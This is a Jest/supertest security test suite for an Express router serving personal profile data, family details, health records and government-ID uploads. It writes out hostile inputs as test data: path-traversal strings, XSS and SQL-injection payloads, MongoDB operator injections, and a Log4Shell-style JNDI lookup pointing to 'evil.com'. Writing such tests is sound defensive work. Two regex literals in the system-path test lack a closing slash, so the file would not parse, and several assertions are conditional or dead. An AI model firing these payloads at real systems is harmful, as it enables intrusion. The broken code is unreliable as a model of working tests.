import request from 'supertest';
import express from 'express';
import userPersonalRouter from '../../routes/userPersonal';
import { User } from '../../models/User';
import { createTestUser, generateTestToken } from '../helpers/testUtils';
import jwt from 'jsonwebtoken';

const app = express();
app.use(express.json());
app.use('/user-personal', userPersonalRouter);

describe('UserPersonal Router Security Tests', () => {
  let testUser: any;
  let validToken: string;
  let maliciousUser: any;
  let maliciousToken: string;

  beforeEach(async () => {
    testUser = await createTestUser({
      email: 'test@example.com',
      role: 'user'
    });
    validToken = jwt.sign(
      { id: testUser._id, email: testUser.email },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );

    maliciousUser = await createTestUser({
      email: 'malicious@example.com',
      role: 'user'
    });
    maliciousToken = jwt.sign(
      { id: maliciousUser._id, email: maliciousUser.email },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );
  });

  describe('Authorization Bypass Vulnerabilities', () => {
    const protectedEndpoints = [
      { method: 'POST', path: '/' },
      { method: 'GET', path: '/' },
      { method: 'PUT', path: '/' },
      { method: 'POST', path: '/family' },
      { method: 'GET', path: '/family' },
      { method: 'PUT', path: '/family' },
      { method: 'GET', path: '/education' },
      { method: 'POST', path: '/education' },
      { method: 'PUT', path: '/education' },
      { method: 'GET', path: '/health' },
      { method: 'POST', path: '/health' },
      { method: 'PUT', path: '/health' },
      { method: 'GET', path: '/profession' },
      { method: 'POST', path: '/profession' },
      { method: 'PUT', path: '/profession' },
      { method: 'GET', path: '/expectations' },
      { method: 'POST', path: '/expectations' },
      { method: 'PUT', path: '/expectations' },
      { method: 'GET', path: '/onboarding-status' },
      { method: 'PUT', path: '/onboarding-status' },
      { method: 'POST', path: '/upload/photos' },
      { method: 'GET', path: '/upload/photos' },
      { method: 'PUT', path: '/upload/photos/123' },
      { method: 'DELETE', path: '/upload/photos/123' },
      { method: 'POST', path: '/upload/government-id' },
      { method: 'GET', path: '/upload/government-id' },
      { method: 'PUT', path: '/upload/government-id' },
    ];

    test('should reject requests without authentication token', async () => {
      for (const endpoint of protectedEndpoints) {
        const response = await request(app)
          [endpoint.method.toLowerCase()](endpoint.path)
          .send({ test: 'data' });
        
        expect(response.status).toBe(401);
        expect(response.body.success).toBe(false);
      }
    });

    test('should reject requests with malformed tokens', async () => {
      const invalidTokens = [
        'invalid',
        'Bearer',
        'Bearer ',
        'Bearer invalid',
        'NotBearer ' + validToken,
        validToken.slice(0, -10) + 'modified',
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .get('/')
          .set('Authorization', `Bearer ${token}`)
          .send();
        
        expect(response.status).toBe(401);
      }
    });

    test('should prevent token substitution attacks', async () => {
      // Try using another user's token to access resources
      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${maliciousToken}`)
        .send();
      
      // Should succeed but only return data for the malicious user, not the test user
      if (response.status === 200) {
        expect(response.body.user?.id).not.toBe(testUser._id.toString());
      }
    });

    test('should prevent privilege escalation attempts', async () => {
      // Try to modify another user's data
      const response = await request(app)
        .put('/')
        .set('Authorization', `Bearer ${maliciousToken}`)
        .send({
          userId: testUser._id.toString(),
          height: 'modified_by_attacker',
        });
      
      expect(response.status).toBe(400);
    });

    test('should validate JWT signature properly', async () => {
      const fakeSecret = 'fake-secret';
      const fakeToken = jwt.sign(
        { id: testUser._id, email: testUser.email, role: 'admin' },
        fakeSecret,
        { expiresIn: '1h' }
      );

      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${fakeToken}`)
        .send();
      
      expect(response.status).toBe(401);
    });
  });

  describe('Object Reference Vulnerabilities', () => {
    test('should prevent direct object reference in photo operations', async () => {
      const otherUser = await createTestUser({
        email: 'other@example.com'
      });
      
      // Try to access another user's photos using their ID
      const response = await request(app)
        .get('/upload/photos')
        .set('Authorization', `Bearer ${validToken}`)
        .query({ userId: otherUser._id.toString() });
      
      // Should not return other user's data
      expect(response.status).toBe(200);
      if (response.body.photos) {
        expect(response.body.photos).not.toContain(otherUser._id.toString());
      }
    });

    test('should prevent manipulation of photoId parameters', async () => {
      const maliciousPhotoIds = [
        '../../../etc/passwd',
        '<script>alert(1)</script>',
        '"; DROP TABLE photos; --',
        '${jndi:ldap://evil.com/x}',
        '../../admin/photos',
      ];

      for (const photoId of maliciousPhotoIds) {
        const response = await request(app)
          .delete(`/upload/photos/${encodeURIComponent(photoId)}`)
          .set('Authorization', `Bearer ${validToken}`);
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Input Validation Security', () => {
    test('should prevent XSS in personal information fields', async () => {
      const xssPayloads = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "';alert(String.fromCharCode(88,83,83));//'",
        "<iframe src=javascript:alert('xss')></iframe>",
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            height: payload,
            weight: payload,
            astrologicalSign: payload,
            birthPlace: payload,
            religion: payload,
            marriedStatus: 'Never Married',
            nationality: payload,
          });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent NoSQL injection in nested objects', async () => {
      const noSqlInjectionPayload = {
        full_address: {
          city: { $ne: null },
          state: { $regex: '.*' },
          zipCode: { $where: 'this.zipCode.length > 0' },
        }
      };

      const response = await request(app)
        .post('/')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          height: '180cm',
          weight: '70kg',
          astrologicalSign: 'Leo',
          birthPlace: 'Test City',
          religion: 'Test Religion',
          marriedStatus: 'Never Married',
          nationality: 'Test Nation',
          ...noSqlInjectionPayload,
        });
      
      expect(response.status).toBe(400);
    });

    test('should validate array inputs securely', async () => {
      const maliciousArrayData = {
        community: [
          "<script>alert('xss')</script>",
          { $ne: null },
          "'; DROP TABLE users; --",
        ],
        profession: [
          "../../../etc/passwd",
          { $regex: ".*admin.*" },
        ],
        diet: [
          "<iframe src=javascript:alert(1)></iframe>",
          { $where: "this.role === 'admin'" },
        ]
      };

      const response = await request(app)
        .post('/expectations')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          userId: testUser._id.toString(),
          age: { from: 25, to: 35 },
          maritalStatus: { "Never Married": true },
          isConsumeAlcoholic: 'no',
          educationLevel: 'Graduate',
          livingInCountry: 'India',
          livingInState: 'Maharashtra',
          ...maliciousArrayData,
        });
      
      expect(response.status).toBe(400);
    });
  });

  describe('File Upload Security Vulnerabilities', () => {
    test('should prevent malicious file upload attempts', async () => {
      const maliciousFileData = {
        filename: '../../../etc/passwd',
        originalname: '<script>alert(1)</script>.jpg',
        mimetype: 'text/html',
        size: 999999999,
        buffer: Buffer.from('<script>alert(1)</script>'),
      };

      const response = await request(app)
        .post('/upload/photos')
        .set('Authorization', `Bearer ${validToken}`)
        .attach('file', Buffer.from('malicious content'), 'virus.exe');
      
      expect(response.status).toBe(400);
    });

    test('should prevent directory traversal in file uploads', async () => {
      const traversalFilenames = [
        '../../../malicious.jpg',
        '..\\..\\..\\malicious.jpg',
        '/etc/passwd',
        'C:\\Windows\\System32\\config',
        '....//....//....//malicious.jpg',
      ];

      for (const filename of traversalFilenames) {
        const response = await request(app)
          .post('/upload/government-id')
          .set('Authorization', `Bearer ${validToken}`)
          .field('filename', filename)
          .attach('file', Buffer.from('test'), filename);
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Data Leakage Vulnerabilities', () => {
    test('should not expose sensitive user information in responses', async () => {
      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${validToken}`);
      
      if (response.status === 200) {
        expect(response.body).not.toHaveProperty('password');
        expect(response.body).not.toHaveProperty('hashedPassword');
        expect(response.body).not.toHaveProperty('__v');
        expect(response.body).not.toHaveProperty('_id');
      }
    });

    test('should not leak database query information', async () => {
      const response = await request(app)
        .get('/family')
        .set('Authorization', `Bearer ${validToken}`);
      
      expect(response.body).not.toHaveProperty('query');
      expect(response.body).not.toHaveProperty('$where');
      expect(response.body).not.toHaveProperty('$regex');
      
      if (response.body.message) {
        expect(response.body.message).not.toContain('mongoose');
        expect(response.body.message).not.toContain('mongodb');
        expect(response.body.message).not.toContain('collection');
      }
    });

    test('should not expose system paths in error messages', async () => {
      const response = await request(app)
        .post('/health')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ invalid: 'data structure' });
      
      if (response.body.message) {
        expect(response.body.message).not.toMatch(/[A-Z]:\\/);
        expect(response.body.message).not.toMatch(/\/usr\/);
        expect(response.body.message).not.toMatch(/\/etc\/);
        expect(response.body.message).not.toContain('node_modules');
      }
    });
  });

  describe('API Parameter Pollution', () => {
    test('should handle parameter pollution in query strings', async () => {
      const response = await request(app)
        .get('/family')
        .set('Authorization', `Bearer ${validToken}`)
        .query('userId=123&userId=456&userId=789');
      
      expect(response.status).toBe(200);
    });

    test('should handle duplicate fields in nested objects', async () => {
      // Test with duplicate keys in form data
      const response = await request(app)
        .put('/family')
        .set('Authorization', `Bearer ${validToken}`)
        .set('Content-Type', 'application/x-www-form-urlencoded')
        .send('fatherName=John&fatherName=Admin&motherName=Jane&motherName=Root');
      
      expect(response.status).toBe(200);
    });

    test('should handle array manipulation attacks', async () => {
      const response = await request(app)
        .put('/')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          height: ['180cm', 'admin'],
          weight: ['70kg', { admin: true }],
          religion: ['Hindu', 'Christian', '../../../etc/passwd'],
        });
      
      expect(response.status).toBe(400);
    });
  });

  describe('HTTP Method Security', () => {
    test('should not allow method override attacks', async () => {
      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${validToken}`)
        .set('X-HTTP-Method-Override', 'DELETE')
        .send();
      
      // Should respond as GET, not as DELETE
      expect(response.status).toBe(200);
    });

    test('should properly handle HEAD requests', async () => {
      const response = await request(app)
        .head('/')
        .set('Authorization', `Bearer ${validToken}`);
      
      // Should not return body content for HEAD requests
      expect(response.text).toBeFalsy();
    });

    test('should reject unsupported methods', async () => {
      const response = await request(app)
        .patch('/')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ test: 'data' });
      
      expect(response.status).toBe(404);
    });
  });

  describe('Race Condition Vulnerabilities', () => {
    test('should handle concurrent updates safely', async () => {
      const promises = [];
      for (let i = 0; i < 5; i++) {
        promises.push(
          request(app)
            .put('/')
            .set('Authorization', `Bearer ${validToken}`)
            .send({
              height: `${180 + i}cm`,
              weight: `${70 + i}kg`,
              astrologicalSign: 'Leo',
              birthPlace: 'Test City',
              religion: 'Test Religion',
              marriedStatus: 'Never Married',
              nationality: 'Test Nation',
            })
        );
      }

      const responses = await Promise.all(promises);
      // At least one should succeed
      const successCount = responses.filter(r => r.status === 200).length;
      expect(successCount).toBeGreaterThan(0);
    });
  });

  describe('Business Logic Vulnerabilities', () => {
    test('should prevent age manipulation in expectations', async () => {
      const response = await request(app)
        .post('/expectations')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          userId: testUser._id.toString(),
          age: { from: 100, to: 18 }, // Invalid range
          maritalStatus: { "Never Married": true },
          isConsumeAlcoholic: 'no',
          educationLevel: 'Graduate',
          community: ['Test'],
          livingInCountry: 'India',
          livingInState: 'Maharashtra',
          profession: ['Engineer'],
          diet: ['Vegetarian'],
        });
      
      expect(response.status).toBe(400);
    });

    test('should prevent invalid marital status combinations', async () => {
      const response = await request(app)
        .post('/')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          height: '180cm',
          weight: '70kg',
          astrologicalSign: 'Leo',
          birthPlace: 'Test City',
          religion: 'Test Religion',
          marriedStatus: 'Never Married',
          nationality: 'Test Nation',
          isHaveChildren: true, // Contradiction
          numberOfChildren: 5,
        });
      
      // Should handle logical inconsistencies appropriately
      expect(response.status).toBe(400);
    });
  });

  describe('Session and Authentication Edge Cases', () => {
    test('should handle expired tokens gracefully', async () => {
      const expiredToken = jwt.sign(
        { id: testUser._id, email: testUser.email },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '-1h' } // Already expired
      );

      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${expiredToken}`);
      
      expect(response.status).toBe(401);
    });

    test('should prevent session fixation attacks', async () => {
      // Try to use a token from one session in another
      const fixedSessionToken = jwt.sign(
        { id: testUser._id, email: testUser.email, sessionId: 'fixed123' },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '1h' }
      );

      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${fixedSessionToken}`)
        .set('Cookie', 'sessionId=different456');
      
      // Should still work if token is valid, but not leak session info
      if (response.status === 200) {
        expect(response.body).not.toHaveProperty('sessionId');
      }
    });
  });

  describe('Content Type and Encoding Security', () => {
    test('should handle malicious content-type headers', async () => {
      const maliciousContentTypes = [
        'application/json; charset=utf-7',
        'text/html',
        '../../../etc/passwd',
        'application/json; boundary=--evil',
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request(app)
          .post('/')
          .set('Authorization', `Bearer ${validToken}`)
          .set('Content-Type', contentType)
          .send(JSON.stringify({
            height: '180cm',
            weight: '70kg',
            astrologicalSign: 'Leo',
            birthPlace: 'Test City',
            religion: 'Test Religion',
            marriedStatus: 'Never Married',
            nationality: 'Test Nation',
          }));
        
        expect(response.status).not.toBe(500);
      }
    });

    test('should handle Unicode and encoding attacks', async () => {
      const unicodeAttacks = [
        'Test\u0000City', // Null byte injection
        'Test\uFEFFCity', // BOM injection
        'Test\u202ECity', // Right-to-left override
        'Test\uD800City', // Surrogate character
      ];

      for (const payload of unicodeAttacks) {
        const response = await request(app)
          .post('/')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            height: '180cm',
            weight: '70kg',
            astrologicalSign: 'Leo',
            birthPlace: payload,
            religion: 'Test Religion',
            marriedStatus: 'Never Married',
            nationality: 'Test Nation',
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Information Disclosure through Headers', () => {
    test('should not expose technology stack in headers', async () => {
      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${validToken}`);
      
      const sensitiveHeaders = [
        'x-powered-by',
        'server',
        'x-aspnet-version',
        'x-framework',
        'x-node-version',
      ];

      for (const header of sensitiveHeaders) {
        expect(response.headers[header]).toBeUndefined();
      }
    });

    test('should not leak debugging information through custom headers', async () => {
      const response = await request(app)
        .get('/')
        .set('Authorization', `Bearer ${validToken}`)
        .set('X-Debug', 'true')
        .set('X-Trace', 'true');
      
      const debugHeaders = [
        'x-debug',
        'x-trace',
        'x-query-time',
        'x-db-queries',
        'x-memory-usage',
      ];

      for (const header of debugHeaders) {
        expect(response.headers[header]).toBeUndefined();
      }
    });
  });
});